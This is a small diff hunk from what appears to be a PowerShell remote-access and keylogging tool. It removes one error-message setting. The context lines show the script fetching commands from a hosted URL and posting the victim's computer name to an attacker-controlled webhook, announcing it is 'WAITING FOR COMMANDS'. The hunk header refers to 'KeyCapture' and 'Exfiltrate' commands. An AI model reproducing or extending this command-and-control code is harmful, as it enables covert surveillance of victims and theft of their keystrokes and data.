@@ -45,7 +45,6 @@ Save a hosted file contents as 'kill' to stop 'KeyCapture' or 'Exfiltrate' comma
 # $hookurl = "YOUR WEBHOOK URL"
 
 $response = Invoke-RestMethod -Uri $GHurl
-$global:errormsg = 0 # 1 = return error messages to chat (off by default)
 $previouscmd = $response
 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":link: ``WAITING FOR COMMANDS..`` :link:"} | ConvertTo-Json
 Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
